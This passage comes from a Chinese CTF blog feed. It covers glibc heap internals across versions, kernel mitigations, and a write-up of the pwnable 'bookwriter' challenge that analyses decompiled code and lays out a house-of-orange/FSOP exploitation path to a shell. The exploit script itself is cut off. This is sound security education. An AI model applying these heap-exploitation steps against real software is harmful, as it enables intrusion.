class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在free的时候会遍历所有tcache，对比要free的是否存在double free</p><h1 id="glibc-2-32"><a href="#glibc-2-32" class="headerlink" title="glibc-2.32"></a>glibc-2.32</h1><h2 id="tcache-2"><a href="#tcache-2" class="headerlink" title="tcache"></a>tcache</h2><h3 id="tcache-put-1"><a href="#tcache-put-1" class="headerlink" title="tcache_put"></a>tcache_put</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br></pre></td></tr></table></figure><p>放入tcache时加密</p><h3 id="tcache-get-1"><a href="#tcache-get-1" class="headerlink" title="tcache_get"></a>tcache_get</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br></pre></td></tr></table></figure><p>tcache取出时解密</p><h2 id="libc-malloc-3"><a href="#libc-malloc-3" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><p>没变化</p><h2 id="int-malloc-3"><a href="#int-malloc-3" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br></pre></td></tr></table></figure><p>fastbin和tcache的时候，会对加密后的指针解密</p><h2 id="libc-free-3"><a href="#libc-free-3" class="headerlink" title="__libc_free"></a>__libc_free</h2><p>没变化</p><h2 id="int-free-3"><a href="#int-free-3" class="headerlink" title="__int_free"></a>__int_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br></pre></td></tr></table></figure><p>fastbin的时候对指针加密，同时判断tcache double free的时候会解密</p><h2 id="tcache-fastbin加密"><a href="#tcache-fastbin加密" class="headerlink" title="tcache&amp;&amp;fastbin加密"></a>tcache&amp;&amp;fastbin加密</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span></span><br><span class="line"><span class="comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>tcache和fastbin新增链表加密</p><p>加密的具体方法是:<strong>取chunk的fd字段(next字段)的地址右移12位,再与要加密的数据异或</strong>,得到结果</p><p>解密则是与加密恰好相反</p><p>并且可以发现:</p><p><strong>对于一条fastbin或tcachebin单链表,从链表头看起,他的第一个chunk成员是不加密的,只有从第二个开始才会进行加密</strong></p><h1 id="glibc-2-34"><a href="#glibc-2-34" class="headerlink" title="glibc-2.34"></a>glibc-2.34</h1><p>发现在该版本去除了所有的hook函数</p><h2 id="libc-malloc-4"><a href="#libc-malloc-4" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><p>主要是去除了hook</p><h2 id="int-malloc-4"><a href="#int-malloc-4" class="headerlink" title="__int_malloc"></a>__int_malloc</h2><p>没变化</p><h2 id="libc-free-4"><a href="#libc-free-4" class="headerlink" title="__libc_free"></a>__libc_free</h2><p>去除了hook</p><h2 id="int-free-4"><a href="#int-free-4" class="headerlink" title="_int_free"></a>_int_free</h2><p>没变化</p><h2 id="tcache-3"><a href="#tcache-3" class="headerlink" title="tcache"></a>tcache</h2><h3 id="key验证"><a href="#key验证" class="headerlink" title="key验证"></a>key验证</h3><p>以往key_entry结构体中用于验证double free的key字段是用tcache填充,现在改为用tcache_key填充</p><p>tcache_key的产生如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Process-wide key to try and catch a double-free in the same thread.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> tcache_key;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The value of tcache_key does not really have to be a cryptographically</span></span><br><span class="line"><span class="comment">   secure random number.  It only needs to be arbitrary enough so that it does</span></span><br><span class="line"><span class="comment">   not collide with values present in applications.  If a collision does happen</span></span><br><span class="line"><span class="comment">   consistently enough, it could cause a degradation in performance since the</span></span><br><span class="line"><span class="comment">   entire list is checked to check if the block indeed has been freed the</span></span><br><span class="line"><span class="comment">   second time.  The odds of this happening are exceedingly low though, about 1</span></span><br><span class="line"><span class="comment">   in 2^wordsize.  There is probably a higher chance of the performance</span></span><br><span class="line"><span class="comment">   degradation being due to a double free where the first free happened in a</span></span><br><span class="line"><span class="comment">   different thread; that&#x27;s a case this check does not cover.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_key_initialize</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="glibc-2-39"><a href="#glibc-2-39" class="headerlink" title="glibc-2.39"></a>glibc-2.39</h1><h2 id="libc-malloc-5"><a href="#libc-malloc-5" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><p>无变化</p><h2 id="int-malloc-5"><a href="#int-malloc-5" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>没变化</p><h2 id="libc-free-5"><a href="#libc-free-5" class="headerlink" title="__libc_free"></a>__libc_free</h2><p>没变化</p><h2 id="int-free-5"><a href="#int-free-5" class="headerlink" title="_int_free"></a>_int_free</h2><p>没什么变化，就是部分调用由<code>_int_free_merge_chunk (av, p, size);</code>来完成</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;细读源码&quot;&gt;&lt;a href=&quot;#细读源码&quot; class=&quot;headerlink&quot; title=&quot;细读源码&quot;&gt;&lt;/a&gt;细读源码&lt;/h1&gt;&lt;p&gt;“Public wrappers”（公共包装器）通常指的是在软件开发中用于封装和提供对外部（公共）接口的函数或类。这些包装器</summary>
      
    
    
    
    <category term="Pwn知识" scheme="http://s1nec-1o.github.io/categories/Pwn%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn小知识2</title>
    <link href="http://s1nec-1o.github.io/2024/02/16/pwn%E5%B0%8F%E7%9F%A5%E8%AF%862/"/>
    <id>http://s1nec-1o.github.io/2024/02/16/pwn%E5%B0%8F%E7%9F%A5%E8%AF%862/</id>
    <published>2024-02-16T12:31:59.000Z</published>
    <updated>2024-04-28T09:08:59.384Z</updated>
    
    <content type="html"><![CDATA[<p>在我们调试的时候总会遇到一些突然出现的heap，但是我们并不知道为什么出现，此时很大可能是因为一些函数调用的时候创建的堆块</p><p>我会记录下我遇到的所有函数虽然可能没什么用</p><ul><li>printf()[0x1041]</li><li>fget()[0x1041]</li></ul><p>接下来就是一些记录，没有什么规律</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">read(fd, &amp;buf, <span class="number">8uLL</span>);                         <span class="comment">// 获得随机字节</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 使用当前时间作为种子</span></span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成随机数</span></span><br><span class="line">    <span class="type">int</span> random_number = rand();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Random number: %d\n&quot;</span>, random_number);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**<code>fread</code>**函数是C标准库中用于从文件中读取数据的函数。它的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *stream)</span>;</span><br></pre></td></tr></table></figure><p>该函数从指定的文件流（stream）中读取数据，并将其存储到指定的内存缓冲区（ptr）中。参数size指定每个元素的大小（以字节为单位），而参数count指定要读取的元素数量。</p><p>fread函数的返回值是实际读取的元素数量。如果返回值与count不相等，可能表示发生了错误或到达了文件结尾。</p><p>**<code>strtol</code>**函数是C标准库中的一个函数，用于将字符串转换为长整型数值。它的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">strtol</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *nptr, <span class="type">char</span> **endptr, <span class="type">int</span> base)</span>;</span><br></pre></td></tr></table></figure><p>该函数将字符串<code>nptr</code>中的内容解析为长整型数值，并返回结果。参数<code>endptr</code>是一个指向字符指针的指针，用于存储转换后的字符串的结束位置。参数<code>base</code>指定了进制，可以是 0、2-36之间的任意整数。当<code>base</code>为 0 时，函数会根据字符串的前缀来确定进制（0x 或 0X 表示十六进制，0 表示八进制，其他情况为十进制）。</p><h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h2><ol><li><p><strong>SMEP（Supervisor Mode Execution Prevention，监管模式执行预防）</strong>：SMEP 是一种硬件机制，用于<strong>防止用户空间的代码在特权级别（如内核模式）执行</strong>。它要求操作系统将用户空间和内核空间的代码分开，并将用户空间的页面标记为不可执行。这样，即使恶意代码成功劫持了程序的执行流程，也无法执行用户空间的代码，从而减少了攻击者对系统的控制能力。</p></li><li><p><strong>SMAP（Supervisor Mode Access Prevention，监管模式访问预防）</strong>：SMAP 是一种硬件机制，用于<strong>防止内核模式下的代码访问用户空间的内存</strong>。它要求操作系统在切换到内核模式时，将用户空间的内存标记为不可访问。这样，即使恶意代码尝试通过内核漏洞或其他手段读取或修改用户空间的数据，也会触发异常并导致操作系统终止恶意行为。</p></li><li><p><strong>PXN（Privileged eXecute Never，特权级别不可执行）</strong>：PXN 是一种硬件机制，用于防止用户空间的代码在特权级别（如内核模式）下执行。它要求操作系统<strong>将用户空间的页面标记为不可执行</strong>，并在特权级别下禁止执行这些页面上的代码。这样，即使恶意代码成功劫持了程序的执行流程，也无法执行用户空间的代码，从而减少了攻击者对系统的控制能力。</p></li><li><p><strong>KERNEXEC</strong>（<strong>Kernel Code Execution Prevention</strong>）：</p><p>KERNEXEC 是一种保护机制，旨在防止内核代码执行的非法修改或执行。它通常通过<strong>将内核空间设置为只读或禁止执行</strong>来实现，从而防止恶意软件修改内核代码或在内核空间执行恶意代码。这种保护机制有助于防止内核空间的攻击和提高系统的安全性。</p></li><li><p><strong>UDEREF</strong>（<strong>User-space Dereference Prevention</strong>）：</p><p>UDEREF 是一种保护机制，用于防止用户空间指针在内核空间被直接解引用。这种保护机制旨在防止恶意用户空间指针被用于攻击内核空间，从而提高系统的安全性。通过<strong>限制用户空间指针在内核空间的访问</strong>，UDEREF 可以减少内核的潜在漏洞和攻击面。</p></li><li><p><strong>KGuard</strong>：</p><p>KGuard 是一种内核保护技术，旨在防止内核栈溢出和ROP（Return-Oriented Programming）攻击。KGuard 通过<strong>引入随机性和检测技术来防止攻击者利用内核栈溢出漏洞或构造ROP链来执行恶意代码</strong>。这种保护机制有助于提高内核的安全性和抵御各种内核级攻击。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在我们调试的时候总会遇到一些突然出现的heap，但是我们并不知道为什么出现，此时很大可能是因为一些函数调用的时候创建的堆块&lt;/p&gt;
&lt;p&gt;我会记录下我遇到的所有函数虽然可能没什么用&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;printf()[0x1041]&lt;/li&gt;
&lt;li&gt;fget()[</summary>
      
    
    
    
    <category term="Pwn知识" scheme="http://s1nec-1o.github.io/categories/Pwn%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>2024-1-31 pwnable_bookwriter</title>
    <link href="http://s1nec-1o.github.io/2024/02/01/2024-1-31-pwnable-bookwriter/"/>
    <id>http://s1nec-1o.github.io/2024/02/01/2024-1-31-pwnable-bookwriter/</id>
    <published>2024-01-31T17:00:07.000Z</published>
    <updated>2024-04-28T09:09:14.003Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwnable-bookwriter"><a href="#pwnable-bookwriter" class="headerlink" title="pwnable_bookwriter"></a>pwnable_bookwriter</h1><h2 id="执行fsop的条件："><a href="#执行fsop的条件：" class="headerlink" title="执行fsop的条件："></a>执行fsop的条件：</h2><ol><li><strong>fp-&gt;_mode&lt;&#x3D;0</strong></li><li><strong>fp-&gt;<code>_IO_write_ptr</code>&gt;fp-&gt;<code>_IO_write_base</code></strong></li></ol><p>​或者(主要是前者)</p><ol><li><strong>fp-&gt;_mode &gt; 0</strong></li><li><strong>_IO_vtable_offset (fp) &#x3D;&#x3D; 0</strong></li><li><strong>fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_ptr</code>&gt;fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_bas</code></strong></li></ol><p></p><h2 id="主要漏洞："><a href="#主要漏洞：" class="headerlink" title="主要漏洞："></a>主要漏洞：</h2><p>​第一个是因为通过程序可以看出内存里只够存取8个chunk，但是在add函数中确实一个i&gt;8的判断，而存储chunk地址的相邻位置就是存取size的地址，那么就会有一个<strong>大字节溢出覆盖</strong></p><p>​第二个是在edit函数中有一个溢出就是可以通过strlen来将size扩大，慢慢的可以有一个<strong>无穷堆溢出</strong></p><p>​第三个就是在Author更改的时候即infor函数中是通过%s来读取的这样就可以<strong>泄露一个堆的地址</strong></p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the BookWriter !&quot;</span>);</span><br><span class="line">  read_author();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( sub_4008CD() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        view();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        information();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见就是一个常规的功能程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_4009AA</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">8</span> )                                <span class="comment">// 9个？</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t add new page anymore!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(&amp;qword_6020A0)[i] )                  <span class="comment">// 6020A0上存的是malloc的地址</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size of page :&quot;</span>);</span><br><span class="line">  size = sub_4008CD();</span><br><span class="line">  v2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">  similar_read((__int64)v2, size);</span><br><span class="line">  (&amp;qword_6020A0)[i] = v2;</span><br><span class="line">  qword_6020E0[i] = size;                       <span class="comment">// 6020E0上存储size</span></span><br><span class="line">  ++dword_602040;                               <span class="comment">// 602040上存的是chunk的个数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个漏洞if ( i &gt; 8 )   判断有问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index of page :&quot;</span>);</span><br><span class="line">  v1 = sub_4008CD();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;out of page:&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !(&amp;qword_6020A0)[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Not found !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">  similar_read((__int64)(&amp;qword_6020A0)[v1], qword_6020E0[v1]);</span><br><span class="line">  qword_6020E0[v1] = <span class="built_in">strlen</span>((&amp;qword_6020A0)[v1]);<span class="comment">// 溢出点，填满之后size变大</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也一个溢出点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">information</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Author : %s\n&quot;</span>, byte_602060);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page : %u\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)dword_602040);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    read_author();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><p>​整个程序中没有free，因此大多数的手法是使用不了的，而这道题要用到一个FSOP手法来getshell</p><p>​利用点1：通过覆写top chunk的size大小为<code>fe1</code>之后再申请一个不大于mmap的极限值又大于top chunk的size就可以将top chunk释放到unsorted bin中</p><p>​利用点2：泄露libc地址，因为源码中显示在分割unsortedbin的chunk的时候，第一次分割会先放到相应的bin里面再分割，此时会给一个remainder进行赋值，之后便是直接分割chunk，因此可以add两个chunk便可以通过覆写fd来输出bk</p><p>​利用点3：可以利用unsorted bin attack将IO_list_all进行覆写，之后IO_list_all会到main arena+88，之后只要满足overflow的条件，再构造一个vtable，改写vtable里的overflow的地址，就可以malloc一个实现getshell(注意此时函数的参数是IO_list_all的地址)</p><p>附上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span 